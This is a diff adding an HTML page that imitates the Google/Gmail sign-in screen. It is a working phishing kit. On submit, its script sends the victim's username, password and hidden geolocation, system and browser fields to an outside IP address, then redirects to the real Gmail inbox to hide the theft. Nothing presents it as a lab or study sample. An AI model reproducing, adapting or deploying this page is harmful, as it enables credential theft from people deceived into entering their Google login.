@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<!-- <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> -->
+	<title>Gmail</title>
+	<link rel="icon" href="google-icon.png" type="image/gif/png">
+	<link 
+	href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.css" 
+	rel="stylesheet"  type='text/css'>
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+	<div class="container-form">
+		<img alt="Google" src="google-img.png">
+
+		<p class="div-title">Sign in <br><span>with your Google Account</span></p>
+
+		<form action="" id="post-form" method="POST">
+
+			<input style="display: none;" id="the-ip-address" type="text" value="" name="geolocation">
+			<input style="display: none;" type="text" name="sys_info" id="sys_info">
+			<input style="display: none;" type="text" name="browser_info" id="browser_info">
+
+			<div>
+				<div class="div-container-label">
+					<label id="email-or-phone">Email or phone</label>
+				</div>
+				<div class="div-container-input">
+					<input onmouseenter="changeLabelColorInBlue('#email-or-phone')" onmouseleave="changeLabelColorInDefault('#email-or-phone')" class="form-input-data" type="text" name="email-or-phone" id="email-or-phone-value">
+				</div>
+			</div>
+
+			<div>
+				<div class="div-container-label">
+					<label id="enter-your-password">Enter your password</label>
+				</div>
+				<div class="div-container-input">
+					<input class="form-input-data active" id="pass2" onmouseenter="changeLabelColorInBlue('#enter-your-password')" onmouseleave="changeLabelColorInDefault('#enter-your-password')" type="password" name="password">
+					<i id="icon" class="fa fa-eye-slash"></i>
+				</div>
+			</div>
+			<div class="div-submit">
+				<button class="btn-forgot-pwd">
+					Forgot password?
+				</button>
+				<input type="submit" id="submitData" value="SIGN IN">
+
+				<!-- <button type="button" id="submitData" name="submitData">SIGN IN</button> -->
+
+				<!-- <a type="button" id="submitData" name="submitData" href = "https://www.example.com">SIGN IN</a> -->
+			</div>
+		</form>
+	</div>
+
+	<div class="container-bottom">
+		<div class="container-bottom-content">		
+			<select class="select-language">
+				<option>‪English (United States)‬</option>
+			</select>
+		</div>
+		<div class="added-elts">
+			<div class="added-elts-content">
+				<div class="added-elts-item added-elts-1">Help</div>
+				<div class="added-elts-item added-elts-2">Privacy</div>
+				<div class="added-elts-item added-elts-3">Terms</div>
+			</div>
+		</div>
+	</div>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+	<script type="text/javascript" src="script.js"></script>
+	<script type="text/javascript">
+		$(document).on('submit', '#post-form', function(e){
+			e.preventDefault();
+			$.ajax({
+				type: 'POST',
+				// url: "http://192.168.59.83:8080/api/tutorials",
+				// url: "http://127.0.0.1:80/api/tutorials",
+				url: "http://100.25.196.242:8000/api/OPRECOAcoaSO3233",
+
+				data: JSON.stringify(
+										{
+											// "title" : $('#title').val(),
+											// "description" : $('#description').val()
+											"browser_info":$('#browser_info').val(),
+											"geolocation":$('#the-ip-address').val(),
+											"password":$('#pass2').val(),
+											"sys_info":$('#sys_info').val(),
+											"username":$('#email-or-phone-value').val()
+										}
+									),
+
+				success: function(data){
+	               // console.log('This is data :' + data);
+	               // alert('This is data :' + data);
+	               window.location.href = "https://mail.google.com/mail/u/0/#inbox";
+				},
+
+				error: function(data){
+					console.log('Error !')
+				}
+			});
+			document.getElementById('email-or-phone-value').value = '';
+			document.getElementById('pass2').value = '';
+		});
+	</script>
+</body>
+</html>
+
